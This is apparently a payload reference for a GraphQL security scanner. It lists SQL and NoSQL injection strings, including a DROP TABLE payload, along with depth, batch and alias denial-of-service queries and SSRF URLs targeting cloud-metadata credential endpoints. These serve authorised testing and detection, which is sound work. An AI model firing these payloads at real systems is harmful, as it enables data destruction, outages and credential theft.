# Payload Reference — GraphQL Scanner

Quick reference for test payloads used in each vulnerability check.

---

## SQL Injection Payloads

Use these in **string-type** input arguments:

```
' OR '1'='1
' OR '1'='1' --
'; DROP TABLE users; --
" OR ""="
1' UNION SELECT null,null,null--
' AND 1=1--
' AND 1=2--
admin'--
1; SELECT * FROM information_schema.tables--
' WAITFOR DELAY '0:0:5'--
```

**Detection signals:**
- SQL error messages (syntax error, unexpected token)
- Different response for `1=1` vs `1=2` (blind SQLi)
- Unexpected data returned
- Response time difference (time-based blind)

---

## NoSQL Injection Payloads

Use these as **object values** where strings are expected:

```json
{"$gt": ""}
{"$ne": null}
{"$ne": "nonexistent"}
{"$regex": ".*"}
{"$exists": true}
{"$where": "1==1"}
```

**Detection signals:**
- Data returned when it shouldn't be
- Different response vs clean input
- Server errors mentioning MongoDB/NoSQL

---

## Query Depth Abuse

Template for nested queries (adapt field names from schema):

```graphql
query DepthTest {
  a: __typename
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Detection signals:**
- Server processes the query without error → vulnerable
- Error about "maximum depth exceeded" → secure

---

## Batch Query Payloads

```json
[
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"}
]
```

**Detection signals:**
- All queries execute → no batch limiting
- Error about batching disabled → secure
- Partial execution with limit → partially secure

---

## Alias-based DoS

Template (adapt `expensiveField` from schema):

```graphql
query AliasTest {
  a1: expensiveField { id }
  a2: expensiveField { id }
  a3: expensiveField { id }
  a4: expensiveField { id }
  a5: expensiveField { id }
  a6: expensiveField { id }
  a7: expensiveField { id }
  a8: expensiveField { id }
  a9: expensiveField { id }
  a10: expensiveField { id }
  a11: expensiveField { id }
  a12: expensiveField { id }
  a13: expensiveField { id }
  a14: expensiveField { id }
  a15: expensiveField { id }
  a16: expensiveField { id }
  a17: expensiveField { id }
  a18: expensiveField { id }
  a19: expensiveField { id }
  a20: expensiveField { id }
}
```

---

## Field Suggestion Probing

Send intentionally misspelled queries:

```graphql
{ usr }
{ uzer }
{ pasword }
{ acounts }
{ prodcts }
```

**Detection signals:**
- Response includes "Did you mean 'user'?" → field name leak
- Generic error without suggestions → secure

---

## SSRF Payloads

For URL/URI input fields:

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/
http://localhost:8080/
http://127.0.0.1:3000/
```

---

## Sensitive Field Name Patterns

Regex patterns to detect in schema:

```
password|passwd|pass_hash|password_hash
token|access_token|refresh_token|api_key|apikey|secret
ssn|social_security|tax_id
credit_card|card_number|cvv|cvc
internal_id|debug|admin_flag|is_admin|role
private_key|encryption_key|signing_key
```
